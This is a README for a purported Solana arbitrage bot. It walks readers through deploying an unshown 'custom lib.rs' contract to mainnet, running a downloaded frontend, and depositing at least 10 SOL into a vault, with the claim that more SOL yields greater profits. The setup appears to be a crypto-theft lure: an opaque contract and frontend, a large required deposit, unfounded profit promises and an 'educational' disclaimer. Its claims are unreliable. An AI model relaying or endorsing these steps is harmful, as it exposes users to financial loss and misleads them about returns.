# ⚡ Solana Arbitrage Bot

This is a fully on-chain arbitrage bot built on the **Solana blockchain** using native **Rust**. It performs real-time token arbitrage across top decentralized exchanges like Raydium, Orca, and Jupiter. This guide will walk you through deploying the smart contract and running the frontend interface.

> 💡 **Important:** This project is for educational purposes. Use it responsibly and at your own risk.

## ✅ Features

- Written in native Rust using Solana's `solana_program` crate  
- Interacts with deep liquidity pools on DEXs  
- Uses a PDA (Program Derived Address) vault for secure fund management  
- Simple frontend interface for deployment and interaction

---

## 🧠 What is a PDA?

A **Program Derived Address (PDA)** is a special type of Solana account generated by a program using predefined seeds. PDAs cannot sign transactions themselves but are controlled by the smart contract. In this bot, the PDA acts as a **vault** to hold your SOL securely while the bot executes trades.

## 🛠️ Deployment Instructions

### 1. Deploy the Smart Contract on [beta.solpg.io](https://beta.solpg.io)

- Visit [https://beta.solpg.io](https://beta.solpg.io)  
- Create a new project  
  - **Framework**: Select **Native (Rust)**  
  - **Project Name**: Name it as you like  
- Delete the default `lib.rs` file and **paste your custom `lib.rs`** bot code

---

### 2. Connect to Mainnet

- Go to **Settings → Endpoint → Mainnet**  
- ⚠️ If Mainnet doesn’t work:
  - Get a free RPC node from [QuickNode](https://www.quicknode.com/)
  - Go to **Settings → Custom** and paste the QuickNode Mainnet URL

---

### 3. Connect Your Wallet

- Connect your **Phantom wallet** to `beta.solpg.io`  
- Ensure it’s set to **Mainnet**

---

### 4. Build and Deploy the Program

- Click **Build** → then **Deploy**  
- 💸 Estimated Cost: **2.4 SOL**

---

## 💻 Frontend Setup

### 5. Download the Frontend

- Download the `frontend.zip` from this repo and extract it

### 6. Install Visual Studio Code

- Download here: [https://code.visualstudio.com/](https://code.visualstudio.com/)

### 7. Open in VS Code

- Right-click the extracted `frontend` folder → **Open with Code**

### 8. Install Live Server Extension

- Go to **Extensions** in VS Code  
- Search for **Live Server by Ritwick Dey** and install

### 9. Run the App

- Right-click on `index.html` → **Open with Live Server**  
- App will open in your browser:

## 💼 Usage Instructions

### 10. Connect Your Phantom Wallet

- Connect it to the browser frontend on the Live Server page

### 11. Initialize PDA Vault

- Click the **Initialize Vault** button  
  (This sets up the PDA using your wallet as signer)

### 12. Deposit SOL into PDA

- You must deposit **at least 10 SOL**  
  💡 The **more SOL**, the **greater the arbitrage profits**, as the bot needs liquidity to cycle through trades

### 13. Start the Arbitrage Bot

- Click on **Start Bot**  
- The bot will begin scanning and executing profitable trades

### 14. Monitor Your PDA

- Watch as SOL accumulates in the PDA when the bot performs profitable arbitrage

### 15. Withdraw Funds

- Use the **Withdraw** function to transfer SOL from PDA to your main wallet or another account

---

## 📎 Notes

- Arbitrage depends on market conditions — profitability varies  
- You can stop the bot anytime by disconnecting the wallet  
- Gas/transaction costs are covered from the PDA SOL balance
